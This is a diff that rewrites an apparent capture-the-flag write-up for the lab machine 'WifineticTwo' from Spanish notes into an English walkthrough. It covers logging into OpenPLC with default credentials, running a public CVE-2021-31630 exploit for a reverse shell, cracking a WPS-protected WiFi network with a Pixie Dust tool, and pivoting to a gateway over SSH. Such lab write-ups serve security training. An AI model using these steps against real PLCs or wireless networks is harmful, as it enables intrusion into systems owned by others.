@@ -7,6 +7,128 @@
   <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
 </head>
 <body>
-<div class='page'><h1 class='title'>WifineticTwo</h1><br/><p><ol><li> Realizo un escaneo de la máquina<strong> nmap 10.10.11.7 -Pn -sC -sV -A -p- -T4 -oA scan</strong></li><li>Encuentro los servicios <strong>SSH</strong> y <strong>HTTP</strong> abiertos</li><li>Con el parametro -sC encuentro un login </li></ol><img src="images/72-1.png" alt="images/72-1.png" /><ol><li>Pruebo con las credenciales default y consigo entrar &quot;<strong>openplc</strong>:<strong>openplc</strong>&quot;</li><li>Encuentro un apartado para subir programas Pero tienen que ser con extensión .st</li><li>Busco en internet algún exploit y encuentro CVE-2021-31630 que permite RCE Auntentificado.</li><li>Ejecuto la script <strong>python exploit.py -ip &lt;YOUR IP&gt; -p &lt;YOUR PORT&gt; -u &lt;USERNAME&gt; -pwd &lt;PASSWORD&gt;</strong></li><li>Obtengo el reverse shell  </li></ol><img src="images/72-2.png" alt="images/72-2.png" /><ol><li>En esta máquina soy el usuario root pero no encuentro la flag de root. </li></ol><img src="images/72-3.png" alt="images/72-3.png" /><ol><li>Creo que voy a tener que pivotar a otra máquina para obtener el root.</li><li> con <strong>ifconfig</strong> encuentro otra red </li></ol><img src="images/72-4.png" alt="images/72-4.png" /><ol><li>Voy a escanear esta red pero no está <strong>nmap</strong> instalado por lo que uso el comando <strong>arp</strong> </li></ol><img src="images/72-5.png" alt="images/72-5.png" /><ol><li></li></ol><img src="images/72-6.png" alt="images/72-6.png" /><ol><li>Definitivamente el pivoting está ahí</li><li>En la ruta /etc encuentro algo relacionado con el WPA </li></ol><img src="images/72-7.png" alt="images/72-7.png" /><ol><li>Escaneo la wlan0  <strong>iwlist wlan0 scan</strong> </li></ol><img src="images/72-8.png" alt="images/72-8.png" /><ol><li>El protocolo de seguridad es vulnerable a ataques pixie dust </li></ol><img src="images/72-9.png" alt="images/72-9.png" /><ol><li>Este ataque nos permite recuperar la clave de red wifi</li><li>Paso el archivo oneshot.py a mi maquina atacada </li></ol><img src="images/72-10.png" alt="images/72-10.png" /><ol><li>Tenemos que pasarle los parámetros correctos </li></ol><img src="images/72-11.png" alt="images/72-11.png" /><ol><li>Ejecutamos el script<strong> python3 oneshot.py -b 02:00:00:00:01:00 -i wlan0 -K </strong></li><li>Obtenemos la contraseña de la red </li></ol><img src="images/72-12.png" alt="images/72-12.png" /><ol><li>El sistema cuenta con estos comandos tanto como para administrar una red como para administrar los servicios del sistema </li></ol><img src="images/72-13.png" alt="images/72-13.png" /><ol><li>Uso esta guia para conectarme a la red usando wpa_supplicant <a href="https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant">https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant</a> <strong>wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123! | sudo tee -a /etc/wpa_supplicant/wpa_supplicant.conf</strong> </li></ol><img src="images/72-14.png" alt="images/72-14.png" /><ol><li></li></ol><img src="images/72-15.png" alt="images/72-15.png" /><ol><li> Creamos otro archivo en <strong>systemd</strong> </li></ol><img src="images/72-16.png" alt="images/72-16.png" /><ol><li>Asignamos la dirección IP<strong> sudo ifconfig wlan0 192.168.1.7 netmask 255.255.255.0 up</strong></li><li>con ip a vemos las direcciónes dentro de la red </li></ol><img src="images/72-17.png" alt="images/72-17.png" /><ol><li>Hago un<strong> arp -a</strong> a esa red y encuentro un gateway</li><li>Accedo a través de ssh a ese gateway y encuentro la flag root </li></ol><img src="images/72-18.png" alt="images/72-18.png" /><ol><li></li></ol></p></div>
+  <div class="page">
+    <h1 class="title">WifineticTwo</h1>
+
+    <section>
+      <h2>Reconnaissance</h2>
+      <p>
+        I start by performing a full Nmap scan against the target machine in order to identify open ports
+        and running services.
+      </p>
+      <pre><code>nmap 10.10.11.7 -Pn -sC -sV -A -p- -T4 -oA scan</code></pre>
+      <p>
+        The scan reveals that SSH and HTTP services are exposed. By using the <strong>-sC</strong> option,
+        I also discover a web-based login panel.
+      </p>
+      <img src="images/72-1.png" alt="images/72-1.png" />
+    </section>
+
+    <section>
+      <h2>Enumeration / Analysis</h2>
+      <p>
+        I attempt to authenticate using default credentials and successfully log in with
+        <strong>openplc:openplc</strong>. Inside the application, I identify a functionality that allows
+        uploading programs, restricted to files with the <strong>.st</strong> extension.
+      </p>
+      <p>
+        Searching for known vulnerabilities affecting this software, I find
+        <strong>CVE-2021-31630</strong>, which allows authenticated remote code execution.
+      </p>
+      <p>
+        I execute the public exploit script, providing my IP address, listening port, and valid credentials.
+      </p>
+      <pre><code>python exploit.py -ip &lt;YOUR IP&gt; -p &lt;YOUR PORT&gt; -u &lt;USERNAME&gt; -pwd &lt;PASSWORD&gt;</code></pre>
+      <p>
+        This results in a successful reverse shell on the target system.
+      </p>
+      <img src="images/72-2.png" alt="images/72-2.png" />
+    </section>
+
+    <section>
+      <h2>Exploitation</h2>
+      <p>
+        Once inside the system, I confirm that I am running commands as the root user. However,
+        the expected root flag is not present on this machine.
+      </p>
+      <img src="images/72-3.png" alt="images/72-3.png" />
+      <p>
+        This suggests that pivoting to another network segment may be required. By checking the
+        network configuration with <strong>ifconfig</strong>, I identify an additional network interface.
+      </p>
+      <img src="images/72-4.png" alt="images/72-4.png" />
+      <p>
+        Since <strong>nmap</strong> is not installed on the system, I rely on the <strong>arp</strong> command
+        to enumerate hosts on the newly discovered network.
+      </p>
+      <img src="images/72-5.png" alt="images/72-5.png" />
+      <img src="images/72-6.png" alt="images/72-6.png" />
+      <p>
+        This confirms that lateral movement is possible. While inspecting the filesystem, I notice
+        configuration files under <strong>/etc</strong> related to WPA wireless networking.
+      </p>
+      <img src="images/72-7.png" alt="images/72-7.png" />
+    </section>
+
+    <section>
+      <h2>Wireless Pivoting</h2>
+      <p>
+        I scan the wireless interface using <strong>iwlist</strong> to identify nearby access points.
+      </p>
+      <pre><code>iwlist wlan0 scan</code></pre>
+      <img src="images/72-8.png" alt="images/72-8.png" />
+      <p>
+        The identified wireless network uses a security protocol that is vulnerable to
+        <strong>Pixie Dust</strong> attacks, which can allow recovery of the WiFi passphrase.
+      </p>
+      <img src="images/72-9.png" alt="images/72-9.png" />
+      <p>
+        This type of attack enables extraction of the wireless key. I transfer the
+        <strong>oneshot.py</strong> script to the compromised machine and prepare the required parameters.
+      </p>
+      <img src="images/72-10.png" alt="images/72-10.png" />
+      <img src="images/72-11.png" alt="images/72-11.png" />
+      <p>
+        I then execute the script against the target access point.
+      </p>
+      <pre><code>python3 oneshot.py -b 02:00:00:00:01:00 -i wlan0 -K</code></pre>
+      <p>
+        The attack succeeds, revealing the wireless network password.
+      </p>
+      <img src="images/72-12.png" alt="images/72-12.png" />
+    </section>
+
+    <section>
+      <h2>Privilege Escalation</h2>
+      <p>
+        The system provides several utilities for managing both network connections and system services.
+        Using the recovered WiFi credentials, I configure the connection with <strong>wpa_supplicant</strong>,
+        following documented guidelines.
+      </p>
+      <pre><code>wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123! | sudo tee -a /etc/wpa_supplicant/wpa_supplicant.conf</code></pre>
+      <img src="images/72-13.png" alt="images/72-13.png" />
+      <img src="images/72-14.png" alt="images/72-14.png" />
+      <img src="images/72-15.png" alt="images/72-15.png" />
+      <p>
+        I create an additional <strong>systemd</strong> configuration file to ensure the interface is properly managed.
+      </p>
+      <img src="images/72-16.png" alt="images/72-16.png" />
+      <p>
+        After bringing the interface up, I manually assign an IP address to the wireless interface.
+      </p>
+      <pre><code>sudo ifconfig wlan0 192.168.1.7 netmask 255.255.255.0 up</code></pre>
+      <p>
+        Using <strong>ip a</strong>, I verify connectivity and identify other hosts within the network.
+      </p>
+      <img src="images/72-17.png" alt="images/72-17.png" />
+      <p>
+        An <strong>arp -a</strong> scan reveals a gateway device. I connect to this host via SSH and
+        successfully locate the <strong>root</strong> flag, completing the machine.
+      </p>
+      <img src="images/72-18.png" alt="images/72-18.png" />
+    </section>
+
+  </div>
 </body>
+
 </html>
